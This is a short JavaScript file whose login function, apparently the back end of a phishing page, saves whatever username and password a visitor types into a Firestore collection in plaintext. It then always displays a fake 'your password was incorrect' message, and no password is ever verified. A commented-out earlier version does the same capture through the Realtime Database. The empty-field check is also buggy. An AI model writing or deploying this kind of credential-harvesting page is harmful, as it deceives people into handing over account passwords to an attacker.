function login(){
var db = firebase.firestore();

var username=document.getElementById("name").value;
var pass=document.getElementById("password").value;

if (username == null || username == "", pass == null || pass == "") {
    alert("Please Fill All Required Field");
    return false;
  }else{


db.collection("Users").doc().set({
    name: username,
    passwords: pass
})
.then(() => {
    console.log("Document successfully written!");
})
.catch((error) => {
    console.error("Error writing document: ", error);
});

document.getElementById("demo").innerHTML = "Sorry, your password was incorrect. Please <br> double-check your password.";

}

}

//<script src="https://www.gstatic.com/firebasejs/8.4.2/firebase-firestore.js"></script>
//function login(){
    //firebase.database().ref("User").set({
      //  name: document.getElementById("name").value,
      //  password: document.getElementById("password").value

   // });
//}